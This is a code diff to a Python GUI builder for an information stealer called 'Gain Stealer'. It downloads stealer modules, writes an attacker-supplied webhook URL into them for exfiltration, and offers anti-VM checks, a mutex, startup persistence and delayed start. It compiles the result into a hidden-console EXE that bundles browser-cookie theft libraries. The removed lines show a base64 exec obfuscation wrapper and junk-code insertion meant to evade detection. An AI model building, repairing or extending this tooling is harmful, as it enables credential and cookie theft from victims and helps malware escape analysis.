@@ -3,19 +3,15 @@ from tkinter import ttk, scrolledtext, messagebox, filedialog
 import os
 import json
 import tempfile
-import base64
-import random
-import string
 import subprocess
 import sys
 import requests
 from datetime import datetime
-import random
 
 class ModularGainBuilder:
     def __init__(self, root):
         self.root = root
-        self.root.title("Gain Stealer Modular Builder v6.0")
+        self.root.title("Gain Stealer Builder v7.0")
         self.root.geometry("1000x700")
         
         self.raw_urls = {
@@ -48,12 +44,6 @@ class ModularGainBuilder:
             'telegram': tk.BooleanVar(value=False)
         }
         
-        self.obfuscation = {
-            'remove_comments': tk.BooleanVar(value=True),
-            'base64_encode': tk.BooleanVar(value=True),
-            'add_junk': tk.BooleanVar(value=False)
-        }
-        
         self.anti_analysis = {
             'anti_vm': tk.BooleanVar(value=True),
             'startup_delay': tk.BooleanVar(value=True),
@@ -70,7 +60,7 @@ class ModularGainBuilder:
         notebook = ttk.Notebook(self.root)
         notebook.pack(fill='both', expand=True, padx=10, pady=10)
         
-        tabs = ['main', 'features', 'obfuscation', 'anti_analysis', 'build']
+        tabs = ['main', 'features', 'anti_analysis', 'build']
         
         for tab in tabs:
             frame = ttk.Frame(notebook)
@@ -80,8 +70,6 @@ class ModularGainBuilder:
                 self.setup_main_tab(frame)
             elif tab == 'features':
                 self.setup_features_tab(frame)
-            elif tab == 'obfuscation':
-                self.setup_obfuscation_tab(frame)
             elif tab == 'anti_analysis':
                 self.setup_anti_analysis_tab(frame)
             elif tab == 'build':
@@ -91,7 +79,7 @@ class ModularGainBuilder:
         frame = ttk.Frame(parent, padding="20")
         frame.pack(fill='both', expand=True)
         
-        ttk.Label(frame, text="Gain Stealer Modular Builder", font=("Arial", 16, "bold")).pack(pady=(0, 20))
+        ttk.Label(frame, text="Gain Stealer Builder v7.0", font=("Arial", 16, "bold")).pack(pady=(0, 20))
         
         webhook_frame = ttk.Frame(frame)
         webhook_frame.pack(fill='x', pady=10)
@@ -134,33 +122,38 @@ class ModularGainBuilder:
         for text, key in features_list:
             ttk.Checkbutton(frame, text=text, variable=self.features[key]).pack(anchor='w', pady=5)
     
-    def setup_obfuscation_tab(self, parent):
-        frame = ttk.Frame(parent, padding="20")
-        frame.pack(fill='both', expand=True)
-        
-        ttk.Label(frame, text="Code Obfuscation", font=("Arial", 14, "bold")).pack(anchor='w', pady=(0, 15))
-        
-        ttk.Checkbutton(frame, text="Remove Comments", variable=self.obfuscation['remove_comments']).pack(anchor='w', pady=5)
-        ttk.Checkbutton(frame, text="Base64 Encode Main Code", variable=self.obfuscation['base64_encode']).pack(anchor='w', pady=5)
-        ttk.Checkbutton(frame, text="Add Junk Code", variable=self.obfuscation['add_junk']).pack(anchor='w', pady=5)
-        ttk.Checkbutton(frame, text="Compile to EXE", variable=self.compile_exe).pack(anchor='w', pady=20)
-    
     def setup_anti_analysis_tab(self, parent):
         frame = ttk.Frame(parent, padding="20")
         frame.pack(fill='both', expand=True)
         
         ttk.Label(frame, text="Anti-Analysis Features", font=("Arial", 14, "bold")).pack(anchor='w', pady=(0, 15))
         
-        ttk.Checkbutton(frame, text="Anti-VM Detection", variable=self.anti_analysis['anti_vm']).pack(anchor='w', pady=5)
-        ttk.Checkbutton(frame, text="Mutex Check (Single Instance)", variable=self.anti_analysis['mutex']).pack(anchor='w', pady=5)
-        ttk.Checkbutton(frame, text="Persistence (Startup)", variable=self.anti_analysis['persist']).pack(anchor='w', pady=5)
+        self.anti_vm_check = ttk.Checkbutton(frame, text="Anti-VM Detection", 
+                                            variable=self.anti_analysis['anti_vm'])
+        self.anti_vm_check.pack(anchor='w', pady=5)
         
-        ttk.Checkbutton(frame, text="Startup Delay", variable=self.anti_analysis['startup_delay']).pack(anchor='w', pady=10)
+        self.mutex_check = ttk.Checkbutton(frame, text="Mutex Check (Single Instance)", 
+                                          variable=self.anti_analysis['mutex'])
+        self.mutex_check.pack(anchor='w', pady=5)
         
-        delay_frame = ttk.Frame(frame)
-        delay_frame.pack(fill='x', pady=5)
-        ttk.Label(delay_frame, text="Delay seconds:").pack(side='left')
-        ttk.Spinbox(delay_frame, from_=5, to=300, textvariable=self.anti_analysis['delay_seconds'], width=10).pack(side='left', padx=10)
+        self.persist_check = ttk.Checkbutton(frame, text="Persistence (Startup)", 
+                                           variable=self.anti_analysis['persist'])
+        self.persist_check.pack(anchor='w', pady=5)
+        
+        self.delay_var = tk.BooleanVar(value=True)
+        self.delay_check = ttk.Checkbutton(frame, text="Startup Delay", 
+                                          variable=self.anti_analysis['startup_delay'],
+                                          command=self.toggle_delay_spinbox)
+        self.delay_check.pack(anchor='w', pady=10)
+        
+        self.delay_frame = ttk.Frame(frame)
+        self.delay_frame.pack(fill='x', pady=5)
+        
+        ttk.Label(self.delay_frame, text="Delay seconds:").pack(side='left')
+        self.delay_spinbox = ttk.Spinbox(self.delay_frame, from_=5, to=300, 
+                                        textvariable=self.anti_analysis['delay_seconds'], 
+                                        width=10, state='normal')
+        self.delay_spinbox.pack(side='left', padx=10)
     
     def setup_build_tab(self, parent):
         frame = ttk.Frame(parent, padding="20")
@@ -174,9 +167,20 @@ class ModularGainBuilder:
         btn_frame = ttk.Frame(frame)
         btn_frame.pack()
         
-        ttk.Button(btn_frame, text="Download Modules", command=self.download_modules, width=20).pack(side='left', padx=5)
-        ttk.Button(btn_frame, text="Build Python Script", command=lambda: self.build_stealer(compile_exe=False), width=20).pack(side='left', padx=5)
-        ttk.Button(btn_frame, text="Build EXE", command=lambda: self.build_stealer(compile_exe=True), width=20).pack(side='left', padx=5)
+        ttk.Button(btn_frame, text="Download Modules", 
+                  command=self.download_modules, width=20).pack(side='left', padx=5)
+        ttk.Button(btn_frame, text="Build Python Script", 
+                  command=lambda: self.build_stealer(compile_exe=False), 
+                  width=20).pack(side='left', padx=5)
+        ttk.Button(btn_frame, text="Build EXE", 
+                  command=lambda: self.build_stealer(compile_exe=True), 
+                  width=20).pack(side='left', padx=5)
+    
+    def toggle_delay_spinbox(self):
+        if self.anti_analysis['startup_delay'].get():
+            self.delay_spinbox.config(state='normal')
+        else:
+            self.delay_spinbox.config(state='disabled')
     
     def update_urls(self):
         try:
@@ -225,12 +229,15 @@ class ModularGainBuilder:
             
             if 'config' in self.modules:
                 webhook_url = self.webhook_var.get().strip()
-                if '{WEBHOOK_URL}' in self.modules['config']:
-                    webhook_with_quotes = f'"{webhook_url}"'
-                    config_code = self.modules['config'].replace('{WEBHOOK_URL}', webhook_with_quotes)
+                config_code = self.modules['config']
+                
+                if 'REPLACE_ME' in config_code:
+                    config_code = config_code.replace('"REPLACE_ME"', f'"{webhook_url}"')
+                elif '{WEBHOOK_URL}' in config_code:
+                    config_code = config_code.replace('{WEBHOOK_URL}', webhook_url)
                 else:
                     import re
-                    config_code = re.sub(r'WEBHOOK_URL\s*=\s*".*?"', f'WEBHOOK_URL = "{webhook_url}"', self.modules['config'])
+                    config_code = re.sub(r'WEBHOOK_URL\s*=\s*"[^"]*"', f'WEBHOOK_URL = "{webhook_url}"', config_code)
                 
                 final_code += config_code + "\n\n"
             
@@ -277,15 +284,6 @@ class ModularGainBuilder:
             if 'main' in self.modules:
                 final_code += self.modules['main'] + "\n\n"
             
-            if self.obfuscation['remove_comments'].get():
-                final_code = self.remove_comments(final_code)
-            
-            if self.obfuscation['base64_encode'].get():
-                final_code = self.base64_encode(final_code)
-            
-            if self.obfuscation['add_junk'].get():
-                final_code = self.add_junk_code(final_code)
-            
             output_name = self.output_var.get().strip() or "gain"
             py_filename = output_name + ".py"
             
@@ -305,75 +303,15 @@ class ModularGainBuilder:
             self.log(traceback.format_exc())
             messagebox.showerror("Build Error", str(e))
     
-    def check_raw_modules(self):
-        required_placeholders = {
-            'config': ['{WEBHOOK_URL}'],
-            'anti_analysis': ['{ANTI_VM}', '{STARTUP_DELAY}', '{DELAY_SECONDS}', '{MUTEX}', '{PERSIST}'],
-            'data_handler': ['{FEATURE_CONDITIONS}']
-        }
-        
-        for module_name, placeholders in required_placeholders.items():
-            if module_name in self.modules:
-                module_code = self.modules[module_name]
-                for placeholder in placeholders:
-                    if placeholder in module_code:
-                        self.log(f"{module_name} has placeholder: {placeholder}")
-                    else:
-                        self.log(f"{module_name} missing placeholder: {placeholder}")
-    
-    def remove_comments(self, code):
-        lines = code.split('\n')
-        clean_lines = []
-        for line in lines:
-            if '#' in line:
-                line = line.split('#')[0]
-            if line.strip():
-                clean_lines.append(line)
-        return '\n'.join(clean_lines)
-    
-    def base64_encode(self, code):
-        encoded = base64.b64encode(code.encode()).decode()
-        wrapper = '''import base64
-exec(base64.b64decode("''' + encoded + '''"))'''
-        return wrapper
-    
-    def add_junk_code(self, code):
-        import random
-        import string
-        
-        junk_lines = [
-            '# ' + ''.join(random.choices(string.ascii_letters + string.digits, k=50)),
-            'junk_var_' + str(random.randint(1000, 9999)) + ' = "' + ''.join(random.choices(string.ascii_letters, k=20)) + '"',
-            'def junk_func_' + str(random.randint(1000, 9999)) + '(): pass'
-        ]
-        
-        lines = code.split('\n')
-        new_lines = []
-        
-        for line in lines:
-            new_lines.append(line)
-            if line.strip() and not line.strip().startswith('#') and random.random() > 0.7:
-                new_lines.append(random.choice(junk_lines))
-        
-        return '\n'.join(new_lines)
-    
     def compile_to_exe(self, py_filename, output_name):
         self.log("Compiling to EXE...")
         
         try:
-            try:
-                subprocess.run(['pyinstaller', '--version'], capture_output=True, shell=True, timeout=5)
-            except:
-                self.log("PyInstaller not found. Installing...")
-                result = subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyinstaller'], capture_output=True, text=True, shell=True)
-                if result.returncode != 0:
-                    self.log(f"Failed to install PyInstaller: {result.stderr}")
-                    return
-            
             pyinstaller_cmd = [
-                'pyinstaller',
+                sys.executable,
+                '-m',
+                'PyInstaller',
                 '--onefile',
-                '--windowed',
                 '--noconsole',
                 f'--name={output_name}',
                 '--hidden-import=win32timezone',
@@ -383,19 +321,21 @@ exec(base64.b64decode("''' + encoded + '''"))'''
                 '--hidden-import=browser_cookie3',
                 '--hidden-import=requests',
                 '--hidden-import=psutil',
-                '--add-data=*;.',
-                '--clean'
+                '--clean',
+                '--distpath=./dist',
+                '--workpath=./build',
+                '--specpath=./'
             ]
             
-            try:
-                subprocess.run(['upx', '--version'], capture_output=True, shell=True)
-                pyinstaller_cmd.append('--upx-exclude=vcruntime140.dll')
-            except:
-                pass
+            self.log(f"Running: {' '.join(pyinstaller_cmd)} {py_filename}")
             
-            self.log(f"Running PyInstaller...")
-            
-            result = subprocess.run(pyinstaller_cmd + [py_filename], capture_output=True, text=True, shell=True, timeout=300)
+            result = subprocess.run(
+                pyinstaller_cmd + [py_filename],
+                capture_output=True,
+                text=True,
+                shell=True,
+                timeout=300
+            )
             
             if result.returncode == 0:
                 exe_path = os.path.join('dist', output_name + '.exe')
@@ -404,21 +344,30 @@ exec(base64.b64decode("''' + encoded + '''"))'''
                     self.log(f"EXE built successfully: {os.path.abspath(exe_path)}")
                     self.log(f"Size: {exe_size:.2f} MB")
                     
-                    try:
-                        subprocess.run(['upx', '--best', '--lzma', exe_path], capture_output=True, shell=True)
-                    except:
-                        pass
-                    
-                    messagebox.showinfo("Success", f"Build completed!\n\nPython: {os.path.abspath(py_filename)}\nEXE: {os.path.abspath(exe_path)}\nSize: {exe_size:.2f} MB")
+                    messagebox.showinfo(
+                        "Success",
+                        f"Build completed!\n\n"
+                        f"Python: {os.path.abspath(py_filename)}\n"
+                        f"EXE: {os.path.abspath(exe_path)}\n"
+                        f"Size: {exe_size:.2f} MB"
+                    )
                 else:
                     self.log("EXE not found in dist folder")
+                    self.log(f"Output: {result.stdout}")
             else:
-                self.log(f"PyInstaller failed: {result.stderr[:500]}")
+                self.log(f"PyInstaller failed with code: {result.returncode}")
+                self.log(f"Error: {result.stderr}")
+                
+                if "No module named" in result.stderr:
+                    missing_module = result.stderr.split("No module named")[1].split("'")[1]
+                    self.log(f"Try: pip install {missing_module}")
         
         except subprocess.TimeoutExpired:
             self.log("PyInstaller timed out (5 minutes)")
         except Exception as e:
             self.log(f"Compilation error: {str(e)}")
+            import traceback
+            self.log(traceback.format_exc())
 
 if __name__ == "__main__":
     root = tk.Tk()
